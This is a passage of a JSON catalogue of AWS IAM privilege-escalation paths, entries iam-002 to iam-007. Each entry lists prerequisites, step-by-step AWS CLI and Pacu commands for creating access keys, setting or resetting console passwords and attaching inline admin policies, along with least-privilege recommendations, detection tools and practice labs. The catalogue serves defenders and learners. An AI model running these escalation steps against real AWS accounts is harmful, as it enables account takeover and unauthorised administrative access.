        "Target user must have fewer than 2 access keys already"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws iam create-access-key --user-name @username",
          "description": "Create a new access key for the target user"
        },
        {
          "step": 2,
          "command": "aws configure --profile target-user",
          "description": "Configure AWS CLI with the newly created access key"
        },
        {
          "step": 3,
          "command": "aws sts get-caller-identity --profile target-user",
          "description": "Verify access as the target user"
        }
      ],
      "pacu": [
        {
          "step": 1,
          "command": "run iam__enum_users_roles_policies_groups",
          "description": "Enumerate IAM users to find target with fewer than 2 keys"
        },
        {
          "step": 2,
          "command": "run iam__create_access_key --user-name @username",
          "description": "Create access key for target user and automatically configure profile"
        }
      ]
    },
    "recommendation": "Restrict access to `iam:CreateAccessKey` using the principle of least privilege. Only allow\nusers to create access keys for themselves or users they are authorized to manage. Very few\nprincipals need this permission on anyone other than themselves, so it should be restricted\nto only the few principals that need it.\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      }
    ],
    "relatedPaths": [
      "iam-003",
      "iam-004",
      "iam-006"
    ],
    "detectionTools": {
      "pmapper": "https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/iam_edges.py#L35-L55",
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L103",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L278",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L71"
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-createaccesskey",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "IAM-CreateAccessKey",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      },
      "cloudgoat": {
        "type": "open-source",
        "githubLink": "https://github.com/RhinoSecurityLabs/cloudgoat",
        "scenario": "iam_privesc_by_key_rotation",
        "description": "Deploy vulnerable infrastructure using CloudGoat to practice AWS attacks"
      },
      "cybr": {
        "type": "closed-source",
        "description": "Hosted learning environment with interactive AWS security labs",
        "scenario": "https://cybr.com/courses/iam-privilege-escalation-labs/lessons/lab-ctf-iamcreateaccesskey-privesc/",
        "scenarioPricingModel": "paid"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with iam:CreateAccessKey permission on the target user. Can be an IAM user or role with permission to create access keys for other users.\n"
        },
        {
          "id": "target_user",
          "label": "Existing target-user",
          "type": "resource",
          "description": "The target IAM user for whom the access key is created. Must have fewer than 2 existing access keys (AWS limit). The attacker gains access to all permissions attached to this user.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "Full administrative access to the AWS account when the target user has AdministratorAccess or equivalent permissions.\n"
        },
        {
          "id": "some_perms",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "The target user has some elevated permissions. Check for data access (S3, RDS, DynamoDB) or additional privilege escalation paths.\n"
        },
        {
          "id": "no_access",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "The target user has no interesting permissions beyond what the starting principal already had.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "target_user",
          "label": "iam:CreateAccessKey",
          "description": "Execute iam:CreateAccessKey to generate a new access key for the target user. The API returns both the AccessKeyId and SecretAccessKey in the response. Configure the AWS CLI with these credentials to authenticate as the target user.\n\nCommand: `aws iam create-access-key --user-name @username`\n"
        },
        {
          "from": "target_user",
          "to": "admin",
          "label": "If user has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target user has AdministratorAccess or equivalent permissions, the attacker gains full administrative access to the account.\n"
        },
        {
          "from": "target_user",
          "to": "some_perms",
          "label": "If user has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target user has some elevated permissions, check for data access (S3, RDS, DynamoDB) or additional privilege escalation paths.\n"
        },
        {
          "from": "target_user",
          "to": "no_access",
          "label": "If user has no interesting permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target user only has minimal permissions, there may be no meaningful privilege escalation achieved.\n"
        }
      ]
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:CreateAccessKey",
          "resourceConstraints": "Target IAM user must be in the Resource section"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListUsers",
          "resourceConstraints": "Helpful for discovering target users"
        },
        {
          "permission": "iam:GetUser",
          "resourceConstraints": "Useful for viewing user details"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/iam/iam-002.yaml"
  },
  {
    "id": "iam-003",
    "name": "iam:CreateAccessKey + iam:DeleteAccessKey",
    "category": "lateral-movement",
    "services": [
      "iam"
    ],
    "description": "This is a variation of `iam:CreateAccessKey` that works even when the target user already has 2 access keys (the AWS maximum). By combining `iam:CreateAccessKey` with `iam:DeleteAccessKey`, an attacker can first delete one of the existing keys, then create a new access key for themselves, gaining access to the target user's permissions.",
    "prerequisites": {
      "admin": [
        "Target user has 2 access keys (maximum allowed)",
        "Target user must have administrative permissions (e.g., AdministratorAccess)"
      ],
      "lateral": [
        "Target user has 2 access keys (maximum allowed)"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws iam list-access-keys --user-name @username",
          "description": "List existing access keys for the target user"
        },
        {
          "step": 2,
          "command": "aws iam delete-access-key --user-name @username --access-key-id @access-key-id",
          "description": "Delete one of the existing access keys"
        },
        {
          "step": 3,
          "command": "aws iam create-access-key --user-name @username",
          "description": "Create a new access key for the target user"
        },
        {
          "step": 4,
          "command": "aws configure --profile target-user",
          "description": "Configure AWS CLI with the newly created access key"
        }
      ],
      "pacu": [
        {
          "step": 1,
          "command": "run iam__create_access_key --user-name @username --delete-existing",
          "description": "Use Pacu to automatically delete an existing key and create a new one"
        }
      ]
    },
    "recommendation": "Restrict access to both `iam:CreateAccessKey` and `iam:DeleteAccessKey` using the principle\nof least privilege. The combination of these permissions is particularly dangerous as it\nbypasses the 2-key limit protection. Monitor for sequences where DeleteAccessKey is\nimmediately followed by CreateAccessKey for the same user.\n",
    "discoveredBy": {
      "name": "Seth Art",
      "organization": "Datadog",
      "date": "2024"
    },
    "references": [
      {
        "title": "AWS IAM User Access Key Limits",
        "url": "https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_iam-quotas.html"
      }
    ],
    "relatedPaths": [
      "iam-002"
    ],
    "detectionTools": {
      "pmapper": "https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/iam_edges.py#L63-L85"
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-deleteaccesskey+createaccesskey",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "IAM-CreateAccessKey",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      },
      "cloudgoat": {
        "type": "open-source",
        "githubLink": "https://github.com/RhinoSecurityLabs/cloudgoat",
        "scenario": "iam_privesc_by_key_rotation",
        "description": "Deploy vulnerable infrastructure using CloudGoat to practice AWS attacks"
      },
      "cybr": {
        "type": "closed-source",
        "description": "Hosted learning environment with interactive AWS security labs",
        "scenario": "https://cybr.com/courses/iam-privilege-escalation-labs/lessons/lab-ctf-iamcreateaccesskey-privesc/",
        "scenarioPricingModel": "paid"
      }
    },
    "toolSupport": {
      "pmapper": false,
      "iamVulnerable": false
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with iam:DeleteAccessKey and iam:CreateAccessKey permissions on the target user. Can be an IAM user or role with permission to delete and create access keys for other users.\n"
        },
        {
          "id": "target_user",
          "label": "target-user (2 keys)",
          "type": "resource",
          "description": "The target IAM user who already has 2 existing access keys (AWS maximum). The attacker must first delete one of the existing keys before creating a new one. Once the new key is created, the attacker gains access to all permissions attached to this user.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "Full administrative access to the AWS account when the target user has AdministratorAccess or equivalent permissions.\n"
        },
        {
          "id": "some_perms",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "The target user has some elevated permissions. Check for data access (S3, RDS, DynamoDB) or additional privilege escalation paths.\n"
        },
        {
          "id": "no_access",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "The target user has no interesting permissions beyond what the starting principal already had.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "target_user",
          "label": "iam:DeleteAccessKey + iam:CreateAccessKey",
          "description": "First, execute iam:DeleteAccessKey to remove one of the target user's existing access keys (freeing up a slot). Then execute iam:CreateAccessKey to generate a new access key for the target user. The API returns both the AccessKeyId and SecretAccessKey in the response. Configure the AWS CLI with these credentials to authenticate as the target user.\n\nCommands:\n```bash\naws iam list-access-keys --user-name @username\naws iam delete-access-key --user-name @username --access-key-id @access-key-id\naws iam create-access-key --user-name @username\n```\n"
        },
        {
          "from": "target_user",
          "to": "admin",
          "label": "If user has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target user has AdministratorAccess or equivalent permissions, the attacker gains full administrative access to the account.\n"
        },
        {
          "from": "target_user",
          "to": "some_perms",
          "label": "If user has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target user has some elevated permissions, check for data access (S3, RDS, DynamoDB) or additional privilege escalation paths.\n"
        },
        {
          "from": "target_user",
          "to": "no_access",
          "label": "If user has no interesting permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target user only has minimal permissions, there may be no meaningful privilege escalation achieved.\n"
        }
      ]
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:CreateAccessKey",
          "resourceConstraints": "Target IAM user must be in the Resource section"
        },
        {
          "permission": "iam:DeleteAccessKey",
          "resourceConstraints": "Target IAM user must be in the Resource section"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListUsers",
          "resourceConstraints": "Helpful for discovering target users"
        },
        {
          "permission": "iam:GetUser",
          "resourceConstraints": "Useful for viewing user details"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/iam/iam-003.yaml"
  },
  {
    "id": "iam-004",
    "name": "iam:CreateLoginProfile",
    "category": "lateral-movement",
    "services": [
      "iam"
    ],
    "description": "Anyone with access to `iam:CreateLoginProfile` can create console login profiles for any user they have this permission on. This permission is often abused by one principal to gain access to another principal and the permissions associated with that principal via the AWS Console.",
    "prerequisites": {
      "admin": [
        "Target user must NOT currently have a login profile",
        "Target user must have administrative permissions (e.g., AdministratorAccess)"
      ],
      "lateral": [
        "Target user must NOT currently have a login profile"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws iam create-login-profile --user-name @username --password @password",
          "description": "Create a console login profile with a known password for the target user"
        },
        {
          "step": 2,
          "command": "# Login to AWS Console with the username and password",
          "description": "Access AWS Console as the target user"
        }
      ]
    },
    "recommendation": "Restrict access to `iam:CreateLoginProfile` using the principle of least privilege. Only allow\nusers to create login profiles for users they are authorized to manage. Very few principals\nneed this permission on anyone other than themselves, so it should be restricted to only the\nfew principals that need it. Monitor use of this sensitive permission using CloudSIEM\ndetections, and look for usage anomalies.\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      }
    ],
    "relatedPaths": [
      "iam-002",
      "iam-006"
    ],
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-createloginprofile",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "IAM-CreateLoginProfile",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      },
      "cybr": {
        "type": "closed-source",
        "description": "Hosted learning environment with interactive AWS security labs",
        "scenario": "https://cybr.com/courses/iam-privilege-escalation-labs/lessons/lab-ctf-iamcreateloginprofile-privesc/",
        "scenarioPricingModel": "paid"
      }
    },
    "detectionTools": {
      "pmapper": "https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/iam_edges.py#L81",
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L120",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L290",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L103"
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with iam:CreateLoginProfile permission on the target user. Can be an IAM user or role with permission to create console login profiles for other users.\n"
        },
        {
          "id": "target_user",
          "label": "Existing target-user",
          "type": "resource",
          "description": "The target IAM user for whom the console login profile is created. Must NOT currently have a login profile (AWS does not allow multiple profiles per user). Once the profile is created, the attacker can login to the AWS Console as this user with the password they set.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "Full administrative access to the AWS account when the target user has AdministratorAccess or equivalent permissions.\n"
        },
        {
          "id": "some_perms",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "The target user has some elevated permissions. Check for data access (S3, RDS, DynamoDB) or additional privilege escalation paths.\n"
        },
        {
          "id": "no_access",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "The target user has no interesting permissions beyond what the starting principal already had.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "target_user",
          "label": "iam:CreateLoginProfile",
          "description": "Execute iam:CreateLoginProfile to create a console login profile with a password of your choosing for the target user. The target user must not currently have a login profile. Once created, login to the AWS Console using the target user's username and your chosen password to authenticate as the target user.\n\nCommand: `aws iam create-login-profile --user-name @username --password @password`\n"
        },
        {
          "from": "target_user",
          "to": "admin",
          "label": "If user has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target user has AdministratorAccess or equivalent permissions, the attacker gains full administrative access to the account via the AWS Console.\n"
        },
        {
          "from": "target_user",
          "to": "some_perms",
          "label": "If user has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target user has some elevated permissions, check for data access (S3, RDS, DynamoDB) or additional privilege escalation paths.\n"
        },
        {
          "from": "target_user",
          "to": "no_access",
          "label": "If user has no interesting permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target user only has minimal permissions, there may be no meaningful privilege escalation achieved.\n"
        }
      ]
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:CreateLoginProfile",
          "resourceConstraints": "Target IAM user must be in the Resource section"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListUsers",
          "resourceConstraints": "Helpful for discovering target users"
        },
        {
          "permission": "iam:GetUser",
          "resourceConstraints": "Useful for viewing user details"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/iam/iam-004.yaml"
  },
  {
    "id": "iam-005",
    "name": "iam:PutRolePolicy",
    "category": "self-escalation",
    "services": [
      "iam"
    ],
    "description": "Anyone with access to `iam:PutRolePolicy` can attach inline policies to any role they have this permission on. This permission is frequently exploited by a principal to grant themselves additional privileges. A principal can also leverage this to escalate the permissions of another principal they can access.",
    "prerequisites": [
      "Principal must be a role (not a user)"
    ],
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws iam put-role-policy --role-name @rolename --policy-name @policyname --policy-document file://escalation_policy.json",
          "description": "Attach an inline policy with elevated permissions to the target role"
        },
        {
          "step": 2,
          "command": "aws sts get-caller-identity",
          "description": "Verify the new permissions are active (for self-escalation)"
        }
      ]
    },
    "recommendation": "Restrict access to `iam:PutRolePolicy` using the principle of least privilege. Very few\nprincipals need this permission, so it should be restricted to only the few principals\nthat need it. Monitor use of this sensitive permission using CloudSIEM detections,\nand look for usage anomalies.\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      }
    ],
    "relatedPaths": [
      "iam-007",
      "iam-009",
      "iam-011"
    ],
    "detectionRules": [
      {
        "platform": "CloudSIEM",
        "url": "https://docs.datadoghq.com/security/default_rules/7b6-2a8-df9/"
      }
    ],
    "detectionTools": {
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L159",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L288",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L76"
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-self-escalation/to-admin/iam-putrolepolicy",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "IAM-PutRolePolicy",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      },
      "cybr": {
        "type": "closed-source",
        "description": "Hosted learning environment with interactive AWS security labs",
        "scenario": "https://cybr.com/courses/iam-privilege-escalation-labs/lessons/lab-ctf-iamputrolepolicy-privesc/",
        "scenarioPricingModel": "paid"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "starting-role",
          "type": "principal",
          "description": "The IAM role with iam:PutRolePolicy permission on itself. The role can attach an inline policy to itself with any permissions, including full administrative access.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "The inline policy takes effect immediately. The starting role now has all permissions specified in the new inline policy, including full administrative access if that was included.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "admin",
          "label": "iam:PutRolePolicy",
          "description": "Execute iam:PutRolePolicy to attach an inline policy with administrative permissions to the role itself. The new inline policy takes effect immediately and grants the role any permissions specified in the policy document.\n\nCommand:\n```bash\naws iam put-role-policy --role-name @rolename --policy-name @policyname --policy-document file://escalation_policy.json\n```\n\nThe role immediately gains all permissions in the policy document, including full administrative access if AdministratorAccess or equivalent permissions were included.\n"
        }
      ]
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:PutRolePolicy",
          "resourceConstraints": "Target role must be in the Resource section. For self-escalation, must have permission on own role."
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/iam/iam-005.yaml"
  },
  {
    "id": "iam-006",
    "name": "iam:UpdateLoginProfile",
    "category": "lateral-movement",
    "services": [
      "iam"
    ],
    "description": "Anyone with access to `iam:UpdateLoginProfile` can change the password of any user they have this permission on. This privilege escalation path requires the user to already have a password set (login profile exists). This permission is often abused by one principal to gain access to another principal and the permissions associated with that principal.",
    "prerequisites": {
      "admin": [
        "Target user must already have a login profile (password)",
        "Target user must have administrative permissions (e.g., AdministratorAccess)"
      ],
      "lateral": [
        "Target user must already have a login profile (password)"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws iam update-login-profile --user-name @username --password @password",
          "description": "Change the password for the target user's console login"
        },
        {
          "step": 2,
          "command": "# Login to AWS Console with the username and new password",
          "description": "Access AWS Console as the target user"
        }
      ]
    },
    "recommendation": "Restrict access to `iam:UpdateLoginProfile` using the principle of least privilege. Only allow\nusers to update the password of users they are authorized to manage, most commonly, themselves.\nVery few principals need this permission on all principals, so it should be restricted to only\nthe few principals that need it. Monitor use of this sensitive permission using CloudSIEM\ndetections, and look for usage anomalies.\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      }
    ],
    "relatedPaths": [
      "iam-002",
      "iam-004"
    ],
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-updateloginprofile",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "IAM-UpdateLoginProfile",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      },
      "cybr": {
        "type": "closed-source",
        "description": "Hosted learning environment with interactive AWS security labs",
        "scenario": "https://cybr.com/courses/iam-privilege-escalation-labs/lessons/lab-ctf-iamupdateloginprofile-privesc/",
        "scenarioPricingModel": "paid"
      }
    },
    "detectionTools": {
      "pmapper": "https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/iam_edges.py#L94-L107",
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L117",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L550-L570",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L61"
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with iam:UpdateLoginProfile permission on the target user. Can be an IAM user or role with permission to update the console password of other users.\n"
        },
        {
          "id": "target_user",
          "label": "Existing target-user",
          "type": "resource",
          "description": "The target IAM user whose console password is being changed. Must already have a login profile (console password) configured. The attacker changes this user's password and can then log into the AWS Console as this user, gaining access to all permissions attached to the user.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "Full administrative access to the AWS account when the target user has AdministratorAccess or equivalent permissions.\n"
        },
        {
          "id": "some_perms",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "The target user has some elevated permissions. Check for data access (S3, RDS, DynamoDB) or additional privilege escalation paths.\n"
        },
        {
          "id": "no_access",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "The target user has no interesting permissions beyond what the starting principal already had.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "target_user",
          "label": "iam:UpdateLoginProfile",
          "description": "Execute iam:UpdateLoginProfile to change the console password for the target user. The attacker sets a new password of their choosing and can then log into the AWS Console as the target user using the username and new password.\n\nCommand: `aws iam update-login-profile --user-name @username --password @password`\n"
        },
        {
          "from": "target_user",
          "to": "admin",
          "label": "If user has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target user has AdministratorAccess or equivalent permissions, the attacker gains full administrative access to the account through the AWS Console.\n"
        },
        {
          "from": "target_user",
          "to": "some_perms",
          "label": "If user has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target user has some elevated permissions, check for data access (S3, RDS, DynamoDB) or additional privilege escalation paths.\n"
        },
        {
          "from": "target_user",
          "to": "no_access",
          "label": "If user has no interesting permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target user only has minimal permissions, there may be no meaningful privilege escalation achieved.\n"
        }
      ]
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:UpdateLoginProfile",
          "resourceConstraints": "Target IAM user must be in the Resource section"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListUsers",
          "resourceConstraints": "Helpful for discovering target users"
        },
        {
          "permission": "iam:GetUser",
          "resourceConstraints": "Useful for viewing user details"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/iam/iam-006.yaml"
  },
  {
    "id": "iam-007",
    "name": "iam:PutUserPolicy",
    "category": "self-escalation",
    "services": [
      "iam"
    ],
    "description": "Anyone with access to `iam:PutUserPolicy` can attach inline policies to any user they have this permission on. This permission is frequently exploited by a principal to grant themselves additional privileges. A principal can also leverage this to escalate the permissions of another principal they can access.",
    "prerequisites": [
      "Principal must be a user (not a role)"
    ],
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws iam put-user-policy --user-name @username --policy-name @policyname --policy-document file://escalation_policy.json",
          "description": "Attach an inline policy with elevated permissions to the target user"
        },
        {
          "step": 2,
          "command": "aws sts get-caller-identity",
          "description": "Verify the new permissions are active (for self-escalation)"
        }
      ]
    },
    "recommendation": "Restrict access to `iam:PutUserPolicy` using the principle of least privilege. Very few\nprincipals need this permission, so it should be restricted to only the few principals\nthat need it. Monitor use of this sensitive permission using CloudSIEM detections,\nand look for usage anomalies.\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      }
    ],
    "relatedPaths": [
      "iam-001",
      "iam-005",
      "iam-008",
      "iam-010"
    ],
    "detectionTools": {
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L127",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L522-L525",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L109"
    },
    "detectionRules": [
      {
        "platform": "CloudSIEM",
        "url": "https://docs.datadoghq.com/security/default_rules/7b6-2a8-df9/"
      }
    ],
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-self-escalation/to-admin/iam-putuserpolicy",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "IAM-PutUserPolicy",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      },
      "cybr": {
        "type": "closed-source",
        "description": "Hosted learning environment with interactive AWS security labs",
        "scenario": "https://cybr.com/courses/iam-privilege-escalation-labs/lessons/lab-ctf-iamputuserpolicy-privesc/",
        "scenarioPricingModel": "paid"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "starting-user",
          "type": "principal",
          "description": "The IAM user with iam:PutUserPolicy permission on itself. The user can attach an inline policy to itself with any permissions, including full administrative access.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "The inline policy takes effect immediately. The starting user now has all permissions specified in the new inline policy, including full administrative access if that was included.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "admin",
          "label": "iam:PutUserPolicy",
          "description": "Execute iam:PutUserPolicy to attach an inline policy with administrative permissions to the user itself. The new inline policy takes effect immediately and grants the user any permissions specified in the policy document.\n\nCommand:\n```bash\naws iam put-user-policy --user-name @username --policy-name @policyname --policy-document file://escalation_policy.json\n```\n\nThe user immediately gains all permissions in the policy document, including full administrative access if AdministratorAccess or equivalent permissions were included.\n"
        }
      ]
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:PutUserPolicy",
          "resourceConstraints": "Target user must be in the Resource section. For self-escalation, must have permission on own user."
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/iam/iam-007.yaml"
  },
  {
    "id": "iam-008",
    "name": "iam:AttachUserPolicy",
    "category": "self-escalation",
